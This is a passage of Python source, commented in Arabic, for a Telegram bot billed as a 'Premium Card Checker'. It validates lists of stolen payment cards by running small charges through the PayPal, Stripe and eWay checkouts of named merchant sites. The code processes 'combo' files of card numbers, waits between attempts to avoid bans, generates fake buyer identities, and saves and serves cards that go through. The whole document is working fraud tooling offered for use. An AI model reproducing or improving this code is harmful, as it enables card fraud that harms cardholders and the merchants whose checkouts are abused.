                'time': round(time.time() - start_time, 1),
                'card_display': f"{number[:6]}******{number[-4:]}",
                'card_info': self.get_card_info(number)
            }
        
        card_info = self.get_card_info(number)
        
        # اختيار البوابة
        if gateway_type == "rarediseases":
            result, user_info = self.check_card_rarediseases(card_line)
        elif gateway_type == "shopify":
            result, user_info = self.check_card_shopify(card_line)
        elif gateway_type == "switchupcb":
            result, user_info = self.check_card_switchupcb(card_line)
        elif gateway_type == "sportyshealth":
            import asyncio
            result, user_info = asyncio.get_event_loop().run_until_complete(self.check_card_sportyshealth(card_line))
        else:  # crisiscafe
            result, user_info = self.check_card_crisiscafe(card_line)
        
        elapsed_time = round(time.time() - start_time, 1)
        
        return {
            'status': result['status'],
            'message': result['message'],
            'time': elapsed_time,
            'card_display': f"{number[:6]}******{number[-4:]}",
            'card_info': card_info,
            'user_info': user_info if user_info else self.generate_user_info(),
            'code': result['code'],
            'month': month,
            'year': year
        }

# ===========================================
# إنشاء كائن البوابة
# ===========================================
gateway = RealPayPalGateway()

# ===========================================
# وظائف المساعدة
# ===========================================
async def save_valid_card(card_line, result):
    """حفظ البطاقة الصالحة"""
    try:
        async with aiofiles.open(VALID_CARDS_FILE, 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            await f.write(f"{timestamp} | {card_line} | {result['message']}\n")
    except Exception as e:
        logger.error(f"Error saving card: {e}")

async def update_user_stats(user_id, result):
    """تحديث إحصائيات المستخدم"""
    if user_id not in user_stats:
        user_stats[user_id] = {
            'total_checked': 0,
            'valid_cards': 0,
            'declined_cards': 0,
            'last_check': None
        }
    
    user_stats[user_id]['total_checked'] += 1
    user_stats[user_id]['last_check'] = datetime.now().isoformat()
    
    if result['status'] == 'CHARGED':
        user_stats[user_id]['valid_cards'] += 1
    else:
        user_stats[user_id]['declined_cards'] += 1
    
    # حفظ الإحصائيات
    try:
        async with aiofiles.open(USER_STATS_FILE, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(user_stats, indent=2))
    except Exception as e:
        logger.error(f"Error saving stats: {e}")

def escape_markdown(text):
    """تهريب الأحرف الخاصة في Markdown"""
    if text is None:
        return 'Unknown'
    text = str(text)
    # تهريب الأحرف الخاصة
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

async def format_card_result(card_line, result):
    """تنسيق نتيجة البطاقة"""
    card_info = result.get('card_info', {})
    user_info = result.get('user_info', {})
    
    # تحديد الرمز بناءً على الحالة
    if result.get('status') == 'CHARGED':
        status_emoji = "✅"
        status_text = "Approved 🔥"
    elif result.get('code') == 'DECLINED':
        status_emoji = "❌"
        status_text = "Declined"
    else:
        status_emoji = "❓"
        status_text = "Unknown"
    
    # الحصول على القيم بأمان
    card_display = result.get('card_display', 'N/A')
    month = result.get('month', 'MM')
    year = result.get('year', 'YY')
    bank = card_info.get('bank', 'Unknown')
    country = card_info.get('country', 'Unknown')
    flag = card_info.get('flag', '')
    card_type = card_info.get('type', 'Unknown')
    brand = card_info.get('brand', 'Unknown')
    result_msg = result.get('message', 'No message')
    time_taken = result.get('time', 0)
    first_name = user_info.get('first_name', 'Unknown') if user_info else 'Unknown'
    last_name = user_info.get('last_name', '') if user_info else ''
    email = user_info.get('email', 'Unknown') if user_info else 'Unknown'
    
    formatted = (
        f"💳 Card Check Result\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📟 Card: {card_display}\n"
        f"📅 Expiry: {month}/{year}\n"
        f"🏦 Bank: {bank}\n"
        f"🌍 Country: {country} {flag}\n"
        f"🏷 Type: {card_type} {brand}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{status_emoji} Status: {status_text}\n"
        f"📝 Response: {result_msg}\n"
        f"⏱ Time: {time_taken}s\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Name: {first_name} {last_name}\n"
        f"📧 Email: {email}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Bot: @chkchannel11"
    )
    
    return formatted

async def process_combo_file(file_path, user_id, message, gateway_type="crisiscafe", bot=None):
    """معالجة ملف كومبو"""
    charged_count = 0
    approved_count = 0
    declined_count = 0
    total_count = 0
    stopped = False
    current_card = ""
    current_status = ""
    
    # الحصول على وقت الاشتراك المتبقي (مثال)
    subscription_time = "57m left"
    points = 0
    
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            lines = await f.readlines()
        
        total_lines = len([l for l in lines if l.strip()])
        
        for i, line in enumerate(lines, 1):
            # التحقق من طلب الإيقاف
            if user_sessions.get(user_id, {}).get('stop_combo', False):
                stopped = True
                break
            
            if not line.strip():
                continue
            
            total_count += 1
            current_card = line.strip()
            
            # معالجة البطاقة
            result = gateway.process_single_card(line.strip(), gateway_type)
            current_status = result.get('status', 'UNKNOWN')
            
            # تحديث العدادات
            if result['status'] == 'CHARGED':
                charged_count += 1
                await save_valid_card(line.strip(), result)
            elif result['status'] in ['APPROVED', 'CVV_FAILURE']:
                approved_count += 1
            else:
                declined_count += 1
            
            # تحديث الإحصائيات
            await update_user_stats(user_id, result)
            
            # تحديث الرسالة مع الواجهة الجديدة (كل 5 بطاقات لتجنب أخطاء Telegram)
            if total_count % 5 == 0 or total_count == total_lines or total_count == 1:
                # إنشاء الأزرار
                keyboard = InlineKeyboardBuilder()
                keyboard.row(
                    InlineKeyboardButton(text=f"💰 Charged ➜ [ {charged_count} ]", callback_data="stat_charged"),
                    InlineKeyboardButton(text=f"✅ Approved ➜ [ {approved_count} ]", callback_data="stat_approved")
                )
                keyboard.row(
                    InlineKeyboardButton(text=f"❌ Declined ➜ [ {declined_count} ]", callback_data="stat_declined"),
                    InlineKeyboardButton(text=f"📁 Cards ➜ [ {total_count}/{total_lines} ]", callback_data="stat_cards")
                )
                keyboard.row(
                    InlineKeyboardButton(text=f"💎 Points ➜ [ 🕐 Subscribed ({subscription_time}) 💎 ]", callback_data="stat_points")
                )
                keyboard.row(
                    InlineKeyboardButton(text="🚫 STOP", callback_data=f"stop_combo:{user_id}")
                )
                
                # تنسيق الرسالة
                status_msg = (
                    f"💳 {current_card}\n\n"
                    f"📊 Status: {current_status}"
                )
                
                try:
                    await message.edit_text(status_msg, reply_markup=keyboard.as_markup())
                except Exception as e:
                    # تجاهل أخطاء تحديث الرسالة
                    logger.debug(f"Message update skipped: {e}")
            
            # تأخير بين البطاقات لتجنب الحظر (8 ثواني)
            await asyncio.sleep(8)
        
        # إعادة تعيين حالة الإيقاف
        if user_id in user_sessions:
            user_sessions[user_id]['stop_combo'] = False
        
        return charged_count, approved_count, declined_count, total_count, stopped
        
    except Exception as e:
        logger.error(f"Error processing combo file: {e}")
        return 0, 0, 0, 0, False

# ===========================================
# معالجات الأوامر
# ===========================================
@router.message(CommandStart())
async def cmd_start(message: Message):
    """معالج أمر /start"""
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    # إنشاء لوحة مفاتيح
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="💳 Single Check", callback_data="single_check"),
        InlineKeyboardButton(text="📁 Combo Check", callback_data="combo_check"),
        InlineKeyboardButton(text="🌐 Select Gateway", callback_data="select_gateway"),
        InlineKeyboardButton(text="📊 Statistics", callback_data="stats"),
        InlineKeyboardButton(text="ℹ️ Help", callback_data="help"),
        InlineKeyboardButton(text="🛠️ Generate User Info", callback_data="generate_info"),
        InlineKeyboardButton(text="📢 Join Channel", url="https://t.me/chkchannel11")
    )
    keyboard.adjust(2)
    
    welcome_text = f"""
{CHANEL_LOGO}

👋 **Welcome, @{username}!**

🚀 **Premium Card Checker Bot**
🔐 Multi-Gateway Support (PayPal)
⚡ Fast & Accurate Results
📊 Detailed Card Information
👤 Auto User Info Generation

📌 **Available Gateways:**
• 💰 CrisisCafe PayPal $1
• 💰 RareDiseases PayPal $1

📢 **Channel:** @chkchannel11
🆔 **Your ID:** `{user_id}`

👇 **Choose an option below:**
"""
    
    await message.answer(
        welcome_text,
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )

@router.callback_query(F.data == "select_gateway")
async def select_gateway_handler(callback: CallbackQuery):
    """معالج اختيار البوابة"""
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="💰 CrisisCafe PayPal $1", callback_data="gateway:crisiscafe"),
        InlineKeyboardButton(text="💰 RareDiseases PayPal $1", callback_data="gateway:rarediseases"),
        InlineKeyboardButton(text="🛒️ Shopify Stripe $8.57", callback_data="gateway:shopify"),
        InlineKeyboardButton(text="💳 SwitchUpCB PayPal $1", callback_data="gateway:switchupcb"),
        InlineKeyboardButton(text="🏥 SportysHealth eWay $9.95", callback_data="gateway:sportyshealth"),
        InlineKeyboardButton(text="🔙 Back", callback_data="back_main")
    )
    keyboard.adjust(1)
    
    await callback.message.edit_text(
        "🌐 **Select Gateway**\n\n"
        "Choose the gateway you want to use:\n\n"
        "• **CrisisCafe** - PayPal Commerce $1 Charge\n"
        "• **RareDiseases** - PayPal Commerce $1 Charge\n"
        "• **Shopify** - Stripe Gateway $8.57 Charge\n\n"
        "⚠️ Gateways charge different amounts for verification.",
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.callback_query(F.data.startswith("gateway:"))
async def gateway_selected_handler(callback: CallbackQuery):
    """معالج البوابة المحددة"""
    gateway_type = callback.data.split(":")[1]
    user_id = callback.from_user.id
    
    # حفظ البوابة المحددة
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['gateway'] = gateway_type
    
    if gateway_type == "crisiscafe":
        gateway_name = "CrisisCafe"
    elif gateway_type == "rarediseases":
        gateway_name = "RareDiseases"
    elif gateway_type == "shopify":
        gateway_name = "Shopify"
    elif gateway_type == "switchupcb":
        gateway_name = "SwitchUpCB"
    elif gateway_type == "sportyshealth":
        gateway_name = "SportysHealth"
    else:
        gateway_name = "CrisisCafe"
    
    await callback.message.edit_text(
        f"✅ **Gateway Selected:** {gateway_name}\n\n"
        "Now you can check cards using this gateway.\n\n"
        "💳 Send a card to check or use /start to go back.",
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer(f"Gateway set to {gateway_name}")

@router.callback_query(F.data == "single_check")
async def single_check_handler(callback: CallbackQuery):
    """معالج فحص بطاقة واحدة"""
    user_id = callback.from_user.id
    gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
    if gateway_type == "crisiscafe":
        gateway_name = "CrisisCafe"
    elif gateway_type == "rarediseases":
        gateway_name = "RareDiseases"
    elif gateway_type == "shopify":
        gateway_name = "Shopify"
    elif gateway_type == "switchupcb":
        gateway_name = "SwitchUpCB"
    elif gateway_type == "sportyshealth":
        gateway_name = "SportysHealth"
    else:
        gateway_name = "CrisisCafe"
    
    await callback.message.edit_text(
        f"💳 **Single Card Check**\n\n"
        f"🌐 **Current Gateway:** {gateway_name}\n\n"
        "📝 Please send your card in one of these formats:\n"
        "• `5208130007850658|09|26|768`\n"
        "• `5208130007850658/09/26/768`\n"
        "• `5208130007850658 09 26 768`\n\n"
        "⏳ I will check it immediately!\n\n"
        "🔙 /back to main menu",
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.message(F.text.regexp(r'^\d{13,19}[\|\/\s;:]\d{1,2}[\|\/\s;:]\d{2,4}[\|\/\s;:]\d{3,4}$'))
async def process_single_card_handler(message: Message):
    """معالج البطاقة الواحدة"""
    user_id = message.from_user.id
    card_line = message.text.strip()
    
    # الحصول على البوابة المحددة
    gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
    gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
    
    # رسالة المعالجة
    processing_msg = await message.answer(
        f"🔄 **Processing Card...**\n\n"
        f"🌐 Gateway: {gateway_name}\n"
        "⏳ Please wait, this may take a few seconds...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    try:
        # معالجة البطاقة
        result = gateway.process_single_card(card_line, gateway_type)
        
        # تحديث الإحصائيات
        await update_user_stats(user_id, result)
        
        # حفظ البطاقة إذا كانت صالحة
        if result['status'] == 'CHARGED':
            await save_valid_card(card_line, result)
        
        # تنسيق النتيجة
        formatted_result = await format_card_result(card_line, result)
        
        # إنشاء لوحة مفاتيح
        keyboard = InlineKeyboardBuilder()
        keyboard.add(
            InlineKeyboardButton(text="💳 Check Another", callback_data="single_check"),
            InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
        )
        
        await processing_msg.edit_text(
            formatted_result,
            reply_markup=keyboard.as_markup()
        )
        
    except Exception as e:
        logger.error(f"Error processing card: {e}")
        await processing_msg.edit_text(
            f"❌ Error processing card:\n{str(e)}\n\n"
            "Please check the format and try again."
        )

@router.callback_query(F.data == "combo_check")
async def combo_check_handler(callback: CallbackQuery):
    """معالج فحص كومبو"""
    user_id = callback.from_user.id
    gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
    if gateway_type == "crisiscafe":
        gateway_name = "CrisisCafe"
    elif gateway_type == "rarediseases":
        gateway_name = "RareDiseases"
    elif gateway_type == "shopify":
        gateway_name = "Shopify"
    elif gateway_type == "switchupcb":
        gateway_name = "SwitchUpCB"
    elif gateway_type == "sportyshealth":
        gateway_name = "SportysHealth"
    else:
        gateway_name = "CrisisCafe"
    
    await callback.message.edit_text(
        f"📁 **Combo File Check**\n\n"
        f"🌐 **Current Gateway:** {gateway_name}\n\n"
        "📎 Please send me a `.txt` file containing cards.\n\n"
        "📝 **File Format:**\n"
        "• One card per line\n"
        "• Format: `CC|MM|YY|CVV`\n"
        "• Example: `5208130007850658|09|26|768`\n\n"
        "⚡ **Features:**\n"
        "• Auto-saves valid cards\n"
        "• Live progress updates\n"
        "• Detailed results\n\n"
        "🔙 /back to main menu",
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.message(F.document)
async def process_combo_file_handler(message: Message):
    """معالج ملف كومبو"""
    user_id = message.from_user.id
    
    # التحقق من نوع الملف
    if not message.document.file_name.endswith('.txt'):
        await message.answer("❌ Please send only `.txt` files!")
        return
    
    # تنزيل الملف
    file_info = await message.bot.get_file(message.document.file_id)
    file_path = f"temp_{user_id}_{message.document.file_name}"
    
    try:
        # تنزيل الملف
        await message.bot.download_file(file_info.file_path, file_path)
        
        # قراءة عدد الأسطر
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            lines = await f.readlines()
            total_cards = len([l for l in lines if l.strip()])
        
        if total_cards == 0:
            await message.answer("❌ File is empty or has invalid format!")
            os.remove(file_path)
            return
        
        gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
        gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
        
        # تأكيد بدء المعالجة
        confirm_text = f"""
📁 **Combo Check Ready**

📊 **File Info:**
• 📄 File: `{message.document.file_name}`
• 💳 Cards: `{total_cards}` lines
• 👤 User: @{message.from_user.username}
• 🌐 Gateway: {gateway_name}

⚠️ **This may take some time depending on the file size.**
⚠️ **Do not send other commands during processing.**

✅ **Start processing?**
"""
        
        keyboard = InlineKeyboardBuilder()
        keyboard.add(
            InlineKeyboardButton(text="✅ Start Processing", callback_data=f"start_combo:{file_path}"),
            InlineKeyboardButton(text="❌ Cancel", callback_data="back_main")
        )
        
        await message.answer(
            confirm_text,
            reply_markup=keyboard.as_markup(),
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        logger.error(f"Error handling combo file: {e}")
        await message.answer(f"❌ Error processing file: {str(e)}")

@router.callback_query(F.data.startswith("stop_combo:"))
async def stop_combo_processing(callback: CallbackQuery):
    """إيقاف معالجة كومبو"""
    user_id = int(callback.data.split(":")[1])
    
    # التحقق من أن المستخدم هو نفسه الذي بدأ الفحص
    if callback.from_user.id != user_id:
        await callback.answer("❌ لا يمكنك إيقاف فحص شخص آخر!", show_alert=True)
        return
    
    # تعيين علامة الإيقاف
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['stop_combo'] = True
    
    await callback.answer("⏹️ جاري إيقاف الفحص...", show_alert=True)

@router.callback_query(F.data.startswith("start_combo:"))
async def start_combo_processing(callback: CallbackQuery):
    """بدء معالجة كومبو"""
    # الرد على ال callback فوراً لتجنب الخطأ
    try:
        await callback.answer("🔄 جاري بدء الفحص...")
    except:
        pass
    
    file_path = callback.data.split(":")[1]
    user_id = callback.from_user.id
    
    # إعادة تعيين حالة الإيقاف
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['stop_combo'] = False
    
    gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
    if gateway_type == "crisiscafe":
        gateway_name = "CrisisCafe"
    elif gateway_type == "rarediseases":
        gateway_name = "RareDiseases"
    elif gateway_type == "shopify":
        gateway_name = "Shopify"
    elif gateway_type == "switchupcb":
        gateway_name = "SwitchUpCB"
    elif gateway_type == "sportyshealth":
        gateway_name = "SportysHealth"
    else:
        gateway_name = "CrisisCafe"
    
    # رسالة البداية
    processing_msg = await callback.message.edit_text(
        f"🔄 **Starting Combo Processing...**\n"
        f"🌐 Gateway: {gateway_name}\n"
        "⏳ Please wait, this may take a while.\n"
        "📊 Cards: Loading...\n"
        "✅ Valid: 0\n"
        "❌ Invalid: 0\n"
        "⏱️ Time: 0s",
        parse_mode=ParseMode.MARKDOWN
    )
    
    try:
        start_time = time.time()
        
        # معالجة الملف
        charged_count, approved_count, declined_count, total_count, stopped = await process_combo_file(
            file_path, user_id, processing_msg, gateway_type
        )
        
        elapsed_time = round(time.time() - start_time, 1)
        valid_count = charged_count + approved_count
        
        # النتيجة النهائية
        if stopped:
            status_title = "⏹️ **Combo Processing Stopped!**"
            status_note = "🔴 **تم إيقاف الفحص بواسطة المستخدم**"
        else:
            status_title = "✅ **Combo Processing Complete!**"
            status_note = "🎉 **Done!** You can download the results file or check another combo."
        
        result_text = f"""
{status_title}

📊 **Results:**
• 📄 File: Processed
• 🌐 Gateway: {gateway_name}
• 💳 Total Cards: `{total_count}`
• 💰 Charged: `{charged_count}`
• ✅ Approved: `{approved_count}`
• ❌ Declined: `{declined_count}`
• ⏱️ Time Taken: `{elapsed_time} seconds`
• 📈 Success Rate: `{round((valid_count/total_count)*100, 2) if total_count > 0 else 0}%`

💾 **Valid cards have been saved to:** `{VALID_CARDS_FILE}`

{status_note}
"""
        
        keyboard = InlineKeyboardBuilder()
        if valid_count > 0 and os.path.exists(VALID_CARDS_FILE):
            keyboard.add(
                InlineKeyboardButton(text="📥 Download Results", callback_data="download_results"),
                InlineKeyboardButton(text="🔄 New Combo", callback_data="combo_check"),
                InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
            )
        else:
            keyboard.add(
                InlineKeyboardButton(text="🔄 New Combo", callback_data="combo_check"),
                InlineKeyboardButton(text="💳 Single Check", callback_data="single_check"),
                InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
            )
        keyboard.adjust(2)
        
        await processing_msg.edit_text(
            result_text,
            reply_markup=keyboard.as_markup(),
            parse_mode=ParseMode.MARKDOWN
        )
        
        # حذف الملف المؤقت
        if os.path.exists(file_path):
            os.remove(file_path)
            
    except Exception as e:
        logger.error(f"Error in combo processing: {e}")
        await processing_msg.edit_text(
            f"❌ **Error during processing:**\n`{str(e)}`\n\n"
            "Please try again or contact support.",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # حذف الملف المؤقت في حالة الخطأ
        if os.path.exists(file_path):
            os.remove(file_path)
    
    await callback.answer()

@router.callback_query(F.data == "download_results")
async def download_results_handler(callback: CallbackQuery):
    """تحميل نتائج البطاقات الصالحة"""
    if os.path.exists(VALID_CARDS_FILE):
        try:
            # إرسال الملف
            document = FSInputFile(VALID_CARDS_FILE, filename="valid_cards.txt")
            await callback.bot.send_document(
                chat_id=callback.from_user.id,
                document=document,
                caption="✅ **Valid Cards File**\n\n"
                       "📅 Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n"
                       "📢 Channel: @chkchannel11",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            await callback.answer("❌ Error sending file!", show_alert=True)
    else:
        await callback.answer("❌ No valid cards file found!", show_alert=True)
    
    await callback.answer()

@router.callback_query(F.data == "stats")
async def stats_handler(callback: CallbackQuery):
    """عرض إحصائيات المستخدم"""
    user_id = callback.from_user.id
    stats = user_stats.get(user_id, {})
    
    stats_text = f"""
📊 **Your Statistics**

👤 **User:** @{callback.from_user.username or 'Unknown'}
🆔 **ID:** `{user_id}`

📈 **Card Checks:**
• 💳 Total Checked: `{stats.get('total_checked', 0)}`
• ✅ Valid Cards: `{stats.get('valid_cards', 0)}`
• ❌ Declined Cards: `{stats.get('declined_cards', 0)}`
• 📊 Success Rate: `{round((stats.get('valid_cards', 0) / max(stats.get('total_checked', 1), 1)) * 100, 2)}%`

⏰ **Last Check:** {stats.get('last_check', 'Never')[:19] if stats.get('last_check') else 'Never'}

📢 **Channel:** @chkchannel11
"""
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="🔄 Refresh", callback_data="stats"),
        InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
    )
    
    await callback.message.edit_text(
        stats_text,
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.callback_query(F.data == "generate_info")
async def generate_info_handler(callback: CallbackQuery):
    """إنشاء معلومات مستخدم عشوائية"""
    user_info = gateway.generate_user_info()
    
    info_text = f"""
🛠️ **Generated User Information**

👤 **Personal Info:**
• 📛 First Name: `{user_info['first_name']}`
• 📛 Last Name: `{user_info['last_name']}`
• 📧 Email: `{user_info['email']}`

🌐 **Browser Info:**
• 🖥️ User Agent: `{user_info['user_agent'][:50]}...`

🔄 Click "Generate New" to create new info.
"""
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="🔄 Generate New", callback_data="generate_info"),
        InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
    )
    
    await callback.message.edit_text(
        info_text,
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.callback_query(F.data == "help")
async def help_handler(callback: CallbackQuery):
    """عرض المساعدة"""
    help_text = """
ℹ️ **Help & Information**

📌 **How to Use:**

1️⃣ **Single Card Check:**
   • Send a card in format: `CC|MM|YY|CVV`
   • Example: `5208130007850658|09|26|768`

2️⃣ **Combo File Check:**
   • Send a `.txt` file with cards
   • One card per line

3️⃣ **Select Gateway:**
   • Choose between CrisisCafe or RareDiseases
   • Both charge $1 for verification

📝 **Supported Formats:**
• `CC|MM|YY|CVV`
• `CC/MM/YY/CVV`
• `CC MM YY CVV`

⚠️ **Important Notes:**
• Cards are checked via PayPal Commerce
• Valid cards will be charged $1
• Results are saved automatically

📢 **Support:** @chkchannel11
"""
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
    )
    
    await callback.message.edit_text(
        help_text,
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.callback_query(F.data == "back_main")
async def back_main_handler(callback: CallbackQuery):
    """العودة للقائمة الرئيسية"""
    user_id = callback.from_user.id
    username = callback.from_user.username or "Unknown"
    
    # إنشاء لوحة مفاتيح
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="💳 Single Check", callback_data="single_check"),
        InlineKeyboardButton(text="📁 Combo Check", callback_data="combo_check"),
        InlineKeyboardButton(text="🌐 Select Gateway", callback_data="select_gateway"),
        InlineKeyboardButton(text="📊 Statistics", callback_data="stats"),
        InlineKeyboardButton(text="ℹ️ Help", callback_data="help"),
        InlineKeyboardButton(text="🛠️ Generate User Info", callback_data="generate_info"),
        InlineKeyboardButton(text="📢 Join Channel", url="https://t.me/chkchannel11")
    )
    keyboard.adjust(2)
    
    welcome_text = f"""
{CHANEL_LOGO}

👋 **Welcome back, @{username}!**

🚀 **Premium Card Checker Bot**
🔐 Multi-Gateway Support (PayPal)
⚡ Fast & Accurate Results

📌 **Available Gateways:**
• 💰 CrisisCafe PayPal $1
• 💰 RareDiseases PayPal $1

👇 **Choose an option below:**
"""
    
    await callback.message.edit_text(
        welcome_text,
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.message(Command("back"))
async def cmd_back(message: Message):
    """العودة للقائمة الرئيسية"""
    await cmd_start(message)

# ===========================================
# الدالة الرئيسية
# ===========================================
async def main():
    """الدالة الرئيسية لتشغيل البوت"""
    # إنشاء كائن البوت
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
    
    # إنشاء وإعداد المشرف
    dp = Dispatcher()
    dp.include_router(router)
    
    # بدء البوت
    logger.info("Starting Premium Card Checker Bot...")
    logger.info("Gateways: CrisisCafe, RareDiseases")
    await dp.start_polling(bot)

if __name__ == "__main__":
    # إنشاء الملفات إذا لم تكن موجودة
    if not os.path.exists(VALID_CARDS_FILE):
        with open(VALID_CARDS_FILE, 'w', encoding='utf-8') as f:
            f.write("# Valid Cards File\n# Generated by Premium Card Checker Bot\n\n")
    
    if not os.path.exists(USER_STATS_FILE):
        with open(USER_STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump({}, f)
    else:
        # تحميل الإحصائيات
        try:
            with open(USER_STATS_FILE, 'r', encoding='utf-8') as f:
                user_stats.update(json.load(f))
        except:
            pass
    
    # تشغيل البوت
    asyncio.run(main())
